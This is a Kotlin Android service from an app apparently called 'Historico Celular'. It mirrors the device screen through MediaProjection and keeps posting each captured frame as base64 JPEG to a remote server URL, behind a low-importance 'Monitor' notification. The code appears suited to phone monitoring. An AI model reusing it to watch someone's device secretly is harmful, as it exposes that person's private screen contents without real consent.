package com.example.historicocelular

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONObject
import java.io.ByteArrayOutputStream

class ScreenService : Service() {

    private var projecao: MediaProjection? = null
    private var display: VirtualDisplay? = null
    private var reader: ImageReader? = null
    private var url = ""
    private val handler = Handler(Looper.getMainLooper())
    private var largura = 0
    private var altura = 0

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val code = intent?.getIntExtra("resultCode", -1) ?: -1
        val data = intent?.getParcelableExtra<Intent>("data")
        url = intent?.getStringExtra("urlServidor") ?: ""

        criarNotificacao()

        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val m = DisplayMetrics()
        @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(m)
        largura = m.widthPixels / 3
        altura = m.heightPixels / 3

        val pm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        projecao = pm.getMediaProjection(code, data!!)
        reader = ImageReader.newInstance(largura, altura, PixelFormat.RGBA_8888, 2)
        display = projecao?.createVirtualDisplay(
            "tela", largura, altura, m.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader?.surface, null, null
        )

        reader?.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val planes = img.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val padding = rowStride - pixelStride * largura
                val bmp = Bitmap.createBitmap(largura + padding / pixelStride, altura, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(buffer)
                val cropped = Bitmap.createBitmap(bmp, 0, 0, largura, altura)
                val baos = ByteArrayOutputStream()
                cropped.compress(Bitmap.CompressFormat.JPEG, 40, baos)
                val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)

                val json = JSONObject().apply { put("imagem", b64) }
                DataSender.postar(url, "tela", json)
            } catch (e: Exception) {
            } finally {
                img.close()
            }
        }, handler)

        return START_STICKY
    }

    private fun criarNotificacao() {
        val canal = "monitor"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(NotificationChannel(canal, "Monitor", NotificationManager.IMPORTANCE_LOW))
        }
        val b = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            Notification.Builder(this, canal)
        else
            @Suppress("DEPRECATION") Notification.Builder(this)
        b.setContentTitle("Historico Celular").setContentText("Compartilhando tela").setSmallIcon(android.R.drawable.ic_menu_view)
        startForeground(1, b.build())
    }

    override fun onDestroy() {
        display?.release(); projecao?.stop(); reader?.close(); super.onDestroy()
    }
}
